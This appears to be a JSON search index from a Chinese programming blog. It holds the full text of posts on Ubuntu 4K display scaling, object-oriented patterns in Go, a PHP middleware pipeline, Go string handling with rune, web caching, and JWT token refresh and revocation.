内置集显理论上是带的动4k+60fps的，但是只支持dp接口，不支持hdmi，这一点可以在intel官网的cpu详细规格里面可以查阅。但是大部分主板都不会带dp接口，很少很少，只有极少部分高端主板会带，而现在大部分独显都会带dp口。 众所周知，NVIDIA的独显在Linux上面的驱动支持都不是太好，但是intel的集显支持非常好，如果你想要使用4k显示器，一个独显少不了，不过据我目前的使用体验来说，1060 表现还不错，建议大家开启高性能模式，如下图： 缩放设置这是重点，根据我经验，在4k+27英寸显示器的配置下，缩放设置很简单，不需要什么环境变量，直接在显示里面设置缩放就行，默认是1，设置一个1.75-2比较合适。实际上，上面这个设置好，已经可以解决99%的缩放问题了，不需要什么环境变量，上一些应用的图给大家看看： deepin缩放有些软件不走上面的缩放设置，比如deepin qq或wechat，估计很多用Linux的都会使用移植的deepin应用，但是也有办法: 1WINEPREFIX&#x3D;~&#x2F;.deepinwine&#x2F;Deepin-WeChat deepin-wine winecfg 在弹出的对话框里面找到graphics设置，设置一个比较合适的dpi，以我个人经验，150-170比较合适，如下图： 网易云音乐网易云的软件在4k下面也是个刺头，暂时没有完美的方案，但是有一个可以凑合用，在网易的desktop文件Exec配置里面加入： 1--force-device-scale-factor&#x3D;1.75 搜狗输入法搜狗输入法其实也是不支持4k自动缩放的，不过我们可以把皮肤的字体设置大一点，达到的效果是一样的：","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://wangbjun.github.io/tags/Ubuntu/"}]},{"title":"Go面向对象写法","slug":"golang-oop","date":"2019-04-19T14:05:43.000Z","updated":"2020-01-08T17:37:51.849Z","comments":true,"path":"2019/04/19/golang-oop/","link":"","permalink":"https://wangbjun.github.io/2019/04/19/golang-oop/","excerpt":"Go并不是一个类似于Java、C++，或PHP这样内置面向对象语法的操作的语言，在Go里面名义上是没有类（class）这个概念的，但是这并不代表Go不能面向对象，毕竟面向对象只是一种设计思想！ 为什么Go并不原生支持面向对象呢？这是一个问题 接下来，我会从面向对象的三大特性封装、继承、多态这个几个方面来讲讲Go是怎么实现的OOP的。","text":"Go并不是一个类似于Java、C++，或PHP这样内置面向对象语法的操作的语言，在Go里面名义上是没有类（class）这个概念的，但是这并不代表Go不能面向对象，毕竟面向对象只是一种设计思想！ 为什么Go并不原生支持面向对象呢？这是一个问题 接下来，我会从面向对象的三大特性封装、继承、多态这个几个方面来讲讲Go是怎么实现的OOP的。 1.封装闲话少说，在Go里面可以使用结构体模拟类: 1234type Goods struct &#123; name string price int&#125; 在Go里面有一个约定俗称的规则，变量名、结构体名、结构体属性成员名大写代表是公开权限，可以被其它包使用。类似于类的public属性。如果小写就类似于private属性。 类里面除了属性之外，一般会有自己的方法，在Go里面可以这样实现(这里我采用的是Go modules结构)： 1234567891011121314151617181920package modelsimport &quot;fmt&quot;type Goods struct &#123; Name string Price int&#125;func (g *Goods) GetName() string &#123; return g.Name&#125;func (g *Goods) SetName(name string) &#123; g.Name &#x3D; name&#125;func (*Goods) String() &#123; fmt.Println(&quot;I am Goods&quot;)&#125; 其实就是在函数名前加一个类型声明，如果你在方法里面不需要使用类本身，则可以省略参数标识。 如何使用这个“类呢”？ 123456789101112131415161718package mainimport ( &quot;demo&#x2F;models&quot; &quot;fmt&quot;)func main() &#123; goods :&#x3D; models.Goods&#123; &quot;笔记本&quot;, 100, &#125; fmt.Printf(&quot;Goods name is %s\\n&quot;, goods.GetName()) goods.SetName(&quot;小米笔记本&quot;) fmt.Printf(&quot;Goods name is %s\\n&quot;, goods.GetName())&#125; 我们可以采用字面量赋值的方式初始化对象，虽然结构体并没有构造函数这个东西，但是我们可以造个差不多的方式出来。 新增这个方法： 1234567func NewGoods(name string, price int) Goods &#123; g :&#x3D; Goods&#123; Name: name, Price: price, &#125; return g&#125; 然后我们就可以这样使用： 12var goods models.Goodsgoods &#x3D; models.NewGoods(&quot;笔记本&quot;, 1000) 其实区别倒是不大，封装了一下，更加简洁，虽然达不到构造函数自动调用的效果。 2.继承Go里面并没有extends这样的语法，但是结构体的成员可以是结构体，这实际上是使用组合实现了继承的效果。 12345678910111213141516package modelstype Apple struct &#123; Goods &#x2F;&#x2F;继承了Goods Color string&#125;&#x2F;&#x2F; 构造函数func NewApple(name string, price int, color string) Apple &#123; apple :&#x3D; Apple&#123; Goods&#123;name, price&#125;, color, &#125; return apple&#125; main.go: 1234567891011package mainimport ( &quot;demo&#x2F;models&quot; &quot;fmt&quot;)func main() &#123; apple :&#x3D; models.NewApple(&quot;红富士苹果&quot;, 200, &quot;red&quot;) fmt.Printf(&quot;Apple name is %s&quot;, apple.GetName())&#125; Apple可以使用Goods的方法和属性，使用组合的好处就是不存在多继承的限制，在很多面向对象的语言里面，只能单继承。 3.多态虽然Go里面也没有implements这样的关键字，但是在Go里面可以使用interface来实现多态效果，而且Go里面的接口相当灵活。 定义接口： 12345package modelstype Saleable interface &#123; Sell()&#125; 实现接口(Apple)： 123func (Apple) Sell() &#123; fmt.Println(&quot;我实现了saleable接口&quot;)&#125; 使用： 1234567891011func main() &#123; apple :&#x3D; models.NewApple(&quot;红富士苹果&quot;, 200, &quot;red&quot;) var i models.Saleable i &#x3D; &amp;apple i.Sell()&#125;---结果---我实现了saleable接口 划重点，在GO里面只要一个结构体（struct）定义了一个接口(interface)里面的所有方法，就意味着这个这个struct实现了这个接口，这是隐式的。可见，在Go里面接口还是挺好用的。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"详解中间件设计模式","slug":"designpattern-middleware","date":"2019-03-12T02:02:46.000Z","updated":"2020-01-08T09:49:48.919Z","comments":true,"path":"2019/03/12/designpattern-middleware/","link":"","permalink":"https://wangbjun.github.io/2019/03/12/designpattern-middleware/","excerpt":"说到中间件（middleware），很多人应该都听说过，但是大体有2种意思，一种是一些衔接不同软件活系统的中间软件，比如说数据库中间件、消息中间件。另一种是在Web软件开发中代码层面的一种设计模式，比如说用户认证中间件、日志中间件，这些中间件的主要作用就是以一种集中统一、几乎无侵入的的方式去处理用户请求,而今天我们要讲的就是中间件设计模式。","text":"说到中间件（middleware），很多人应该都听说过，但是大体有2种意思，一种是一些衔接不同软件活系统的中间软件，比如说数据库中间件、消息中间件。另一种是在Web软件开发中代码层面的一种设计模式，比如说用户认证中间件、日志中间件，这些中间件的主要作用就是以一种集中统一、几乎无侵入的的方式去处理用户请求,而今天我们要讲的就是中间件设计模式。 简介说起中间件模式，估计很多人都想起来下面这张图，一个Web请求经过多个中间件的过滤，像pipeline一样处理这个请求，最终返回响应。 中间件往往部署在路由的地方，用于统一过滤请求，举个例子，我们有一个特殊的服务，必须要求用户的年龄大于18岁，如果不使用中间件，我们传统的做法就是在每个请求的控制器或者方法里面做判断，从功能上说没啥问题，但是代码不够优雅，需要写很多重复代码，而且不利于维护，哪天我们要把这个年龄改成20岁呢？ 但是常见的23种设计模式里面并没有中间件模式，其实中间件是管道模式（也有人说是装饰模式）的一种实现，我也不知道为什么大部分框架都叫做中间件(middleware)…? 说个题外话，大部分设计模式主要就是为了解耦，提高代码可维护性和扩展性，并不是必须的，但是大部分情况下还是有益的。 管道模式管道又称为pipeline，又叫流水线，工厂里面流水线大家应该都见过，一个产品需要经过很多道工序才能完成，比如苹果手机的一根数据线，大概有20多道工序，在工厂里面这些数据线会被放到传送带上面，依次完成各个工序，我们可以把一个请求看作是一个产品，流水线的每道工序看作是处理对象。 下面直接看代码： 1.Middleware.php 12345&lt;?phpinterface Middleware&#123; public function execute(Closure $next);&#125; 2.LogMiddleware.php 12345678910&lt;?phpclass LogMiddleware implements Middleware&#123; public function execute(Closure $next) &#123; echo \"Before Log!\\n\"; $next(); echo \"After Log!\\n\"; &#125;&#125; 3.AuthMiddleware.php 12345678910&lt;?phpclass AuthMiddleware implements Middleware&#123; public function execute(Closure $next) &#123; echo \"Before Check Auth!\\n\"; $next(); echo \"After Check Auth!\\n\"; &#125;&#125; 4.Client.php 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Client&#123; protected $middlewares = []; public function addMiddleware(Middleware $middleware) &#123; $this-&gt;middlewares[] = $middleware; return $this; &#125; public function getClosure() &#123; return function ($current, $next) &#123; return function () use ($current, $next) &#123; return (new $next)-&gt;execute($current); &#125;; &#125;; &#125; public function defaultHandler() &#123; return function () &#123; echo \"开始处理!\\n\"; &#125;; &#125; public function handler() &#123; call_user_func(array_reduce($this-&gt;middlewares, $this-&gt;getClosure(), $this-&gt;defaultHandler())); &#125;&#125; 首先，我们定义了一个Middleware接口，规定了需要实现的方法，然后定义了多个具体实现类。有一个非常关键的地方就是这个方法的参数是有一个闭包函数，然后在实现类里面我们都必须调用这个方法。 最核心的代码在于Client类，首先它有一个成员变量，里面存储了多个实现了Middleware接口的对象，这个类里面最关键的方法就是getClosure，它返回一个闭包函数，这个闭包函数接受2个参数，这2个参数都是实现了Middleware接口的对象，但是这个闭包函数并没有立马执行。 其中一个非常关键的函数就是array_reduce,根据官方文档，array_reduce() 将回调函数 callback 迭代地作用到 array 数组中的每一个单元中，从而将数组简化为单一的值。先看一个非常简单的例子： 12345678910111213$arr = [1, 2, 3, 4, 5];$sum = array_reduce($arr, 'sum', 0);function sum($a, $b)&#123; echo \"before add: $a, $b\\n\"; $sum = $a + $b; echo \"after add: $a, $b\\n\"; return $sum;&#125;var_dump($sum); 结果如下： 123456789101112before add: 0, 1after add: 0, 1before add: 1, 2after add: 1, 2before add: 3, 3after add: 3, 3before add: 6, 4after add: 6, 4before add: 10, 5after add: 10, 5int(15) 可见array_reduce会循环的把数组里面的数据两两代入函数，然后把返回的结果当作新的参数再次代入函数,最终会返回一个多层嵌套的闭包函数，然后通过call_user_func触发调用，这时候就会像拨洋葱一样，先从外面到里面，再从里面往外面。。。 上面的例子运行代码和结果如下： 1234567&lt;?php$client = new Client();$client-&gt;addMiddleware(new LogMiddleware()) -&gt;addMiddleware(new AuthMiddleware());$client-&gt;handler(); 12345Before Check age!Before Log!开始处理!After Log!After Check Age! 仔细看一下这个结果，是不是非常像第一张图那样，不过这个例子里面少了一个非常重要的request对象，这里纯粹只是展示中间件运行原理，完整的实战代码可以参考laravel框架里面的源码，实现原理差不多，只不过框架功能更加全面，考虑的东西更多。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"中间件","slug":"中间件","permalink":"https://wangbjun.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}]},{"title":"Golang字符串处理函数浅析","slug":"golang-string-function","date":"2019-02-12T12:15:43.000Z","updated":"2020-01-09T07:39:30.361Z","comments":true,"path":"2019/02/12/golang-string-function/","link":"","permalink":"https://wangbjun.github.io/2019/02/12/golang-string-function/","excerpt":"","text":"很多从PHP转Go的小伙伴经常会怀恋PHP丰富的字符串函数，Go的标准库针对字符串的操作函数虽然不少但是还是不够丰富，很多时候还得自己造，下面我就结合PHP里面字符串的操作函数来说说Go里面怎么实现。 StringGo是强类型语言，有一个单独的字符串类型 string，如果熟悉Go语言的人应该了解string底层是切片，切片底层是数组，所以字符串也叫字符数组。 举个最简单的例子，有一个字符串 12ab34cd56, 我们要获取其第3到第5个字符之间的元素怎么做呢？ 熟悉PHP的童鞋可以会想到PHP里面有一个 substr的函数可以做到，但是Go里面呢？ 我们打开IDE看一下，其实标准库里面的 strings 包已经有非常多的函数了，大约有20多个，包含常见的trim、index、replace、contain等功能，但是没有找到我们想要的？ 其实很简单，因为string本质上是切片，所以我们可以直接使用切片来分割字符串： 123456789101112131415package mainimport ( \"fmt\")func main() &#123; str := \"12ab34cd56\" fmt.Printf(\"%s\\n\", str[2:4]) //ab fmt.Printf(\"%s\\n\", str[3:]) //b34cd56 fmt.Printf(\"%s\\n\", str[:3]) //12a&#125; 切片的切割用法就不多说了，从0角标开始，包含开始，不包含结束。 不过这种写法是有bug的，它只可以针对单字节字符，针对中文这种多字节字符串就不可以了，PHP里面也一样，PHP里面针对多字节字符有一个 mbstring 扩展，也有 mb_substr 这样的函数专门处理多字节字符。 Rune在国内编程，大部分时候不可避免的要处理中文字符串，所以像计算长度、切割一定要处理好多字节的问题，Go里面针对多字节的字符有一个rune类型，针对上面的这个问题，我们这样做： 1234567891011121314151617package mainimport ( \"fmt\")func main() &#123; str := \"我爱学习Go语言\" rStr := []rune(str) fmt.Printf(\"%s\\n\", string(rStr[2:4])) //学习 fmt.Printf(\"%s\\n\", string(rStr[3:])) //习Go语言 fmt.Printf(\"%s\\n\", string(rStr[:3])) //我爱学&#125; 这种方式完全没问题，如果说问题可能就在于多了一次内存分配，那rune到底是什么呢？ rune类型在Go里面实际上是int32的别名： 12345678// byte is an alias for uint8 and is equivalent to uint8 in all ways. It is// used, by convention, to distinguish byte values from 8-bit unsigned// integer values.type byte = uint8// rune is an alias for int32 and is equivalent to int32 in all ways. It is// used, by convention, to distinguish character values from integer values.type rune = int32 byte是8位，可以表示-128-127之间的数，用来存储单字节字符刚好，但是中文一般使用2-3个字节表示，byte就无能为力了，但是int32用来表示世界上所有字符也绰绰有余。 12345678910r := \"我爱学习Go语言\"fmt.Printf(\"%s\\n\", r)fmt.Printf(\"%v\\n\", []byte(r))fmt.Printf(\"%v\\n\", []rune(r))//运行结果如下：我爱学习Go语言[230 136 145 231 136 177 229 173 166 228 185 160 71 111 232 175 173 232 168 128][25105 29233 23398 20064 71 111 35821 35328] 从上面的例子也可以说明，中文“我”实际上是以230 136 145 3个字节表示的，但是在rune类型里面是以25105表示的，这个数是Unicode编码的10进制表现形式。 所以，我们可以把一个字符串先转成rune数组，然后再使用切片切割。 for…range字符串本质上是字符数组，所以有也可以使用range遍历，而且range在迭代字符串的时候也是按字符遍历的，我们也可以利用这点分割字符串： 123456789101112131415func SubString(str string, start, end int) string &#123; var n, i, k int for k = range str &#123; if n == start &#123; i = k &#125; if n == end &#123; break &#125; n++ &#125; return str[i:k]&#125; reverse再看一个比较常见的PHP函数，反转字符串，在Go标准库里面也没有相应的实现 如果只考虑单字节我们可以很容易写出下面的代码： 1234567func ReverseString(str string) string &#123; b := []byte(str) for i, j := 0, len(b)-1; i &lt; len(b)/2; i, j = i+1, j-1 &#123; b[i], b[j] = b[j], b[i] &#125; return string(b)&#125; 如果考虑到中文等多字节字符可以参考下面这种方式： 1234567891011func ReverseRuneString(s string) string &#123; var start, size, end int buf := make([]byte, len(s)) for end &lt; len(s) &#123; _, size = utf8.DecodeRuneInString(s[start:]) end = start + size copy(buf[len(buf)-end:], s[start:end]) start = end &#125; return string(buf)&#125; 推荐除了字符串之外，PHP的数组功能也很强大，如果你不想自己造轮子，可以使用现成的第三方库，下面简单介绍一下几个项目： 1.https://github.com/syyongx/php2go这个项目是使用Go实现PHP内置的函数库，东西比较多，不过这个库里面并没有特殊处理多字节字符串，需要注意一下。 2.https://github.com/thinkeridea/go-extend这个项目收集了一些常用的操作函数，辅助更快的完成开发工作，并减少重复代码，都是一些比较实用的函数，虽然没有第一个那么全。 3.https://github.com/jianfengye/collectionCollection包目标是用于替换golang原生的Slice，使用场景是在大量不追求极致性能，追求业务开发效能的场景。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"Web开发中用到的Cache","slug":"web-cache-usage","date":"2019-02-01T04:02:46.000Z","updated":"2020-01-08T09:49:09.367Z","comments":true,"path":"2019/02/01/web-cache-usage/","link":"","permalink":"https://wangbjun.github.io/2019/02/01/web-cache-usage/","excerpt":"1.什么是Cache？Cache(音: 侃屎),中文称为缓存，缓存可以说是计算机系统里面一味良药，在很多地方的设计都用到了Cache，比如在CPU里面的一级缓存，二级缓存，好的CPU还有三级缓存。硬盘也有缓存，比如一般1T的机械硬盘会有64M的闪存缓存。 在软件系统里面，缓存更是无处不在，比如浏览器本地缓存、网络缓存、CDN缓存、代理缓存…","text":"1.什么是Cache？Cache(音: 侃屎),中文称为缓存，缓存可以说是计算机系统里面一味良药，在很多地方的设计都用到了Cache，比如在CPU里面的一级缓存，二级缓存，好的CPU还有三级缓存。硬盘也有缓存，比如一般1T的机械硬盘会有64M的闪存缓存。 在软件系统里面，缓存更是无处不在，比如浏览器本地缓存、网络缓存、CDN缓存、代理缓存… 缓存是一种设计思想，在现实生活中也有很多应用，比如京东物流，大家都知道在京东上面买东西快递非常快，那是因为京东在很多大城市的周围建立了自己的仓库，京东把销量比较好的商品提前放在仓库里面。当你下单的时候京东直接从附近的仓库给你发货，速度当然快，最快的情况下几个小时就可以收货。 如果不这样做，直接从厂家发货，比如你在北京，买的东西是从广东生产的，估计至少要2-3天！ 2.Cache解决的是什么问题？Cache主要解决数据获取成本高的问题,当你获取一个数据特别麻烦，成本非常高，这里的成本高可能是时间成本，比如网络请求时间，或者是验证问题，并且这个数据是重复的，多次获取的数据完全一样，那你就可以使用缓存。 在软件开发中，最常见的用法就是用来替代关系型数据库某些功能，比如在一个电商网站里面，一个商品的数据一旦上架之后很少改动，正常情况下，用户每次刷新页面都需要从数据库多个表里面获取同样的商品数据，如果网站用户非常多，这对数据库压力还是很大的，这时候就可以使用缓存，把每个商品的数据缓存起来，关于缓存在哪里这个问题咱们待会再说。 最常见的做法就是以key-value的形式缓存数据，比如在上面的例子里面，以商品ID为key，商品信息为value。缓存一方面是为了降低数据库压力，这样就不用每次都查询数据库了，而且还可以提高网站速度，因为很多缓存是存储在内存里面的，这比磁盘的响应和读取速度高很多数量级。 比如浏览器缓存，很多浏览器都会缓存网站的资源文件，比如图片,js,css,fonts，这样我们就不用每次去网站获取，提高了网页加载速度之外还节省了流量！ 在很多数据变化不大，或者对数据时效性要求不高的地方我们都可以使用缓存来提供应用速度，比如接口缓存，假如我们需要调用一个外部接口获取一些数据，但是这个接口比较慢而我们又需要重复去获取这些数据，这时候也可以加缓存。但是缓存并不是银弹，缓存用的不好也会带来一些数据错乱问题，影响系统功能。 3.Cache时效问题缓存时效是使用缓存最需要解决的问题，比如上面说到的商品信息缓存，虽然这个商品信息并不是经常改动，但是万一改动了呢？这就会带来数据不一致问题。解决这个问题有2种相对简单的方法，一种是给缓存设置一个有效期，比如说缓存10分钟，10分钟之后缓存就会失效，然后重新从数据库查询数据重新设置缓存。 这样即使数据不一致，也最多只会影响10分钟，这在一些对数据时效性要求不高的应用里面也可以接受，主要是操作简单。 另一种方式则是在修改数据的时候主动更新缓存，这在方式虽然保证了缓存是最新的，但是操作起来并不简单，一个系统里面可能有多个修改数据的入口，如果某一个地方忘记更新缓存…。为了解决这个问题，有些人采用监控数据库binlog日志的方法来更新缓存，因为无论你通过什么方法修改数据，最终都要操作数据库，这样做虽然有效，但是明显更复杂。 当然我们也可以结合这2种方式，既给缓存设置一定的有效期，也在修改数据的时候更新缓存，这样即使忘记更新缓存，也能保证数据最终会一致。 在http协议里面，缓存是非常重要的，为了解决缓存时效性问题，协议定义了很多header，比如 Expires、Cache-Control、Last-Modified、If-Modified-Since、Etag，具体含义和用法这里不过多解释，但是这些协议头只是约定了一些规则，具体怎么实现还得看web服务器以及中间的代理服务器，其最终目的都是为了既能充分利用浏览器缓存提供网页加载速度，也能及时获取最新数据。 4.缓存分类如果从客户端到服务器中间的过程来分，缓存一般分为这几种： 1.客户端缓存。这个最常见的就是浏览器缓存，除此之外，其它很多手机App，客户端App理论上讲都可以使用缓存。 2.代理服务器缓存最常见的就是各种CDN缓存。有些公司或者企业内部可能也有自己的缓存服务器。还有一些第三方宽带运营商，比如长城宽带，宽带通这类一般内部都有自己的缓存服务器，因为这些宽带服务商的的流量需要向电信、联通购买，如果它们内部能够缓存常用的资源，就可以大大节省流量开销，这也是为什么这些宽带便宜的原因之一。 3.服务器缓存一个请求如果在客户端本地，中间代理服务器都没有找到缓存的资源，它就会到达最终服务器，我们一般说的 memcached，redis缓存就是指服务器缓存。服务器缓存根据类型的不同也可以分好几种： 一.本地缓存顾名思义，就是指我们把数据缓存在服务器本地，可细分为文件缓存和内存缓存，文件缓存一般适合少量数据，操作简单，读取速度一般，自带持久化，不会比数据库快很多。内存缓存是把数据存储在服务器内存里面，和内存一样，只要Web服务不重启，数据就不会丢失，和文件缓存比，内存缓存要快很多。 但是如果你有多台Web服务器并且做了负载均衡，使用本地缓存可能会带来数据不一致问题，更新起来更麻烦，一般很少用。 二.远程缓存这是针对本地缓存而言，所谓远程是指有一个服务器专门提供缓存服务，多台服务器使用同一个缓存服务，这就解决了本地缓存的问题。咱们最常用的memcached和redis就是属于远程内存缓存，其中redis支持持久化。 三.分布式缓存这是第二种类型的扩展，这时候我们不仅仅有多台Web服务器，还有多台缓存服务器，这时候我们需要解决缓存服务器之间的数据同步问题！ 5.常见内存缓存应用通常情况下，我们很少自己去实现缓存服务，往往采用成熟的第三方缓存应用，通常有以下2个： 1.memcached功能简单，只支持常用的增删改查操作，只支持string类型，不支持持久化，不支持集群，性能优秀。 2.redis基本上可以说memcached有的redis都有，memcached没有的redis也有，redis支持的数据类型非常多，功能强大，而且支持持久化，自带集群功能，社区活跃。所以基本上现在使用redis居多，memcached用来存储session这样的临时数据比较合适。如果只做缓存的话，memcached性能要比redis好那么一丢丢而已，但是redis的功能可不仅仅是缓存。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Cache","slug":"Cache","permalink":"https://wangbjun.github.io/tags/Cache/"}]},{"title":"JWT Token的刷新和作废","slug":"jwt-token-usage","date":"2019-01-21T07:05:45.000Z","updated":"2020-01-09T08:10:29.040Z","comments":true,"path":"2019/01/21/jwt-token-usage/","link":"","permalink":"https://wangbjun.github.io/2019/01/21/jwt-token-usage/","excerpt":"之前一篇简单介绍了下JWT的用法,涉及到token的签发和验证。有人说JWT不适合用于替换传统的 session+cookies 机制用于Web应用的用户登录状态维护，很大原因就是这块问题。 虽然之前的案例里面，我们可以成功在登录后获取一个Token，然后访问服务器的时候带着这个Token，服务器就可以知道当前访问的用户Uid了，假设现在有一下需求： 登录后7天不用重复登录 超过30天没有访问网站则需重新登录，否则一直有效 修改密码功能","text":"之前一篇简单介绍了下JWT的用法,涉及到token的签发和验证。有人说JWT不适合用于替换传统的 session+cookies 机制用于Web应用的用户登录状态维护，很大原因就是这块问题。 虽然之前的案例里面，我们可以成功在登录后获取一个Token，然后访问服务器的时候带着这个Token，服务器就可以知道当前访问的用户Uid了，假设现在有一下需求： 登录后7天不用重复登录 超过30天没有访问网站则需重新登录，否则一直有效 修改密码功能 Token续签问题对于第一个问题，我们可以在jwt的 Payload 里面设置一个过期时间，比如说7天，超过这个时间Token无效。但是如果只是简单的这么做的话就会带来另一个问题：假如一个用户正在访问网站，突然Token失效了，用户就会掉登录，体验太差。 所以，大部分时候我们都是采用第二种策略: 超过xx天不访问网站则需要重新登录，如果中间连续访问网站的话则不要重新登录，对于很多手机App，我们可不希望用户天天输账号密码登录，但如果永久有效可能会带来一些安全问题。 这其实就是Token的续签问题，我们看一下网上提到的一些解决方案： 1.更新Payload里面的过期时间。JWT的Payload里面可以设置一个过期时间，我们可以在用户每次访问的时候把这个过期时间更新一下。由于JWT的secret加密机制，只要exp变了，整个Token就变了，所以这种机制相当于每次重新颁发了一个新的Token。 这种方案简单粗暴，存在性能问题，还有安全问题，以前的那么多Token咋办？ 2.快过期的时候更新Token比如说离过期时间还有不到1个小时的时候才更新Token，性能上面可能好一点，但是如果一个用户一直在访问，但是恰好最后一个1个小时内没有访问网站，那岂不是也gg了？ 3.使用Cache记录Token过期时间Token本身不设置过期时间，然后我们在redis或memcached等缓存里面单独设置一个有效期，每次访问的时候刷新过期时间。 其实这个方案和使用session机制无异，session也可以保存在redis或者memcached里面的。所以，有人戏说这是重新发明了session 。。。 4.使用refreshToken借鉴 oauth2 的设计，返回给客户端一个 refreshToken，允许客户端主动刷新JWT。一般而言，jwt 的过期时间可以设置为数小时，而 refreshToken 的过期时间设置为数天。我对oauth2不太熟悉，不过很明显这个方案更加复杂了，而且为什么不拿旧的Token去刷新JWT呢？ 5.推荐方案最后说一下我觉得比较合适的方案，当服务器接受到一个Token后，如果它已经过期，但是已过期的时间在xx天内，比如说30天，我们就返回一个新的Token。比如说Token的有效期是7天，但是如果过期时间不超过30天就可以用旧的Token换取一个新的Token，如果超过了30天那就需要重新登录。 Token作废问题当用户退出登录、修改密码之后，讲道理我们是需要作废之前的Token，比如说用户的Token被盗用了，只能通过修改密码来防止账号被盗用。如果使用session机制就很简单了，我们清空服务器session，或者使用新的session替换之前旧的session也行。 由于Token是无状态的，理论上只要不过期就可以一直用，你说这咋办？为了安全，必须得做一些额外的工作！ 1.Cache如果你之前是采用把Token存在cache里面这种方案，那么你只要删除cache里面的key就可以了。不过如果你真的是采用这种方案，还不如直接用session，这时候的Token和sessionid没区别。 2.用户关联有人说，建一张表把uid和Token关联起来，这样一个用户只有一个有效的Token，或者存cache也行，建立uid和Token的一对一关系，这方案和1差不多。无论是存表还存cache，每次访问都必不可免的需要访问库或cache。 3.黑名单在数据表或cache里面维护一个黑名单，也避免不了查库或者查cache，为了避免这个库内容过多，可以定期清理数据库，或者给cache设置一个有效期。比如说在上面说的例子里面，有效期应该设置为30天，30天之后就不用管了。 其实我比较喜欢第3种方案，第2种方案如果用户多了对库压力大，而第3种，除非用户经常修改密码或者退出登录，不然这个数据集不会很大。 如果不考虑安全，我们完全可以不考虑Token作废问题，那么我们就必须在防止XSS攻击上面做好工作，比如说使用https，cookies设置httpOnly。。。 是否需要使用JWT Token？看完之后大家是否发现原来JWT Token并没有那么好用，这也是很多人说的不要采用JWT的原因了: 讲真，别再使用JWT了！、请停止使用 JWT 认证 。。。 仔细看完这些文章其实大家会发现JWT尤其适合那些一次性验证的应用，比如说有些网站的文件下载为了防止盗链，会在url后面追加一些字符串，这些字符串其实就是Token，它里面可能包含了用户信息和过期时间，你发送给别人下载或者想盗链就非常麻烦了。 至于用不用我觉得还是看需求，你觉得呢？","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://wangbjun.github.io/tags/JWT/"}]},{"title":"Token 和 JWT Token","slug":"jwt-token-info","date":"2019-01-03T13:05:45.000Z","updated":"2020-01-08T09:23:39.945Z","comments":true,"path":"2019/01/03/jwt-token-info/","link":"","permalink":"https://wangbjun.github.io/2019/01/03/jwt-token-info/","excerpt":"1.Token的用途在很多计算机系统里面都少不了用户认证这一步骤,最常见的认证就是账号密码认证,也就是注册、登录这一流程。 在现实生活中,人也需要认证,大家应该都有个 身份证,回想一下这个身份证是从哪里来的呢?办过身份证的应该都知道,一般情况下,身份证需要本人带着 户口本 去 公安局 (不知道现在改了木有?)办理,工作人员在核对了相关信息,确认无误的情况下会给你颁发一个身份证, 有效期 一般是10-20年,在一些需要认证的时候,你就可以拿出身份证 校验 核对身份,比如买火车票,出国,或者办理其它证件.","text":"1.Token的用途在很多计算机系统里面都少不了用户认证这一步骤,最常见的认证就是账号密码认证,也就是注册、登录这一流程。 在现实生活中,人也需要认证,大家应该都有个 身份证,回想一下这个身份证是从哪里来的呢?办过身份证的应该都知道,一般情况下,身份证需要本人带着 户口本 去 公安局 (不知道现在改了木有?)办理,工作人员在核对了相关信息,确认无误的情况下会给你颁发一个身份证, 有效期 一般是10-20年,在一些需要认证的时候,你就可以拿出身份证 校验 核对身份,比如买火车票,出国,或者办理其它证件. 很多Web系统里面token就类似于身份证,账号密码就相当于咱的户口本和本人,需要核对账号密码后获取,拿到token之后就可以使用一些需要认证的服务,而且token也有有效期，和身份证一样,理论上token必须是唯一。 2.常见的Web认证方式1.HTTP Basic Auth这种方式在早期一些Web系统比较常见，就是那种在浏览器弹出一个框让你输账号密码那种，简单易用，但是缺点一个不安全，其账号密码其实是明文（base64encode）传输的，而且每次都得带上。另外就是太丑了。。。 2.Cookies\\Session这种认证方式其实就是类似我们最开始说的身份证这种，只需要输入一次账号密码，认证成功后，系统会将用户信息存入session，session是服务器的本地存储功能，然后系统根据session生成一个唯一的 sessionid 以cookies的形式发送给浏览器。 cookies是浏览器本地存储，在这套机制里面的作用是用来存储sessionid，你也可以不使用cookies存储，早期有些网站在一些不支持cookies的浏览器上面会把sessionid追加到url上面。 cookies里面存储的sessionid其实就是相当于身份证编号，每次访问网站里面我们带着这个编号，服务器拿着编号就可以找到对应的session里面存储的信息，一般情况下里面会存储一些用户信息，比如uid。 讲道理这套机制其实问题并不大，大部分时候都管用，但是cookies有一个毛病就是无法跨域，很多大公司有很多网站，这些网站域名可能还不一样。而且cookies对现在的手机APP支持不好，原生并不支持cookies。最后，就是服务器存储session也需要一些开销，特别是用户特别多的情况下。还有其它缺点这里就不列出来了，很多文章都有写到。 但是其实我想说这套机制大部分情况下是够用的，特别是对于一些中小型网站来说，简单易用，快速开发。 3.JWT一般说到JWT都会提到token，在我的理解里面token其实就是一个字符串，它可以是jwt token，也可以是sessionid token，token就是是一个携带认证信息的字符串。 网上关于介绍JWT的文章特别多，大同小异，我们这里也懒的再说一遍了，贴一个大神的教程，我觉得讲的挺清晰了，JSON Web Token 入门教程。 简单的说，JWT本质上是一种解决方案标准，该方案下一个token应该有3部分组成: Header、Payload、Signature, 其中前2部分差不多就是明文的，都是json 